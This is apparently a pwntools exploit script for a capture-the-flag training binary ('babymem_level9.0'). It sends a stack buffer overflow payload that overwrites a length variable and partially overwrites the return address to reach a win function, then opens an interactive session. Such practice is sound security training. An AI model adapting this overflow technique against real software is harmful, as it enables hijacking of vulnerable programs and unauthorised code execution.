from pwn import *

while(1):
    # Init
    elf = ELF("/challenge/babymem_level9.0")

    buffer_length = int("58", 16) #local_58
    addition_data = int("18", 16) #local_18
    distance_between_buffer_and_variable_n = buffer_length - addition_data
    win_auth_address_offset = b"\x1e\x24"
    print(buffer_length)
    print(addition_data)

    io = elf.process()

    # Payload
    payload = b"A"*(distance_between_buffer_and_variable_n) + p64(0x50) + win_auth_address_offset

    # Interaction
    io.recvuntil("size:")
    io.sendline(str(buffer_length + 2))

    io.recvuntil("bytes)!")
    io.sendline(payload)

    io.interactive()
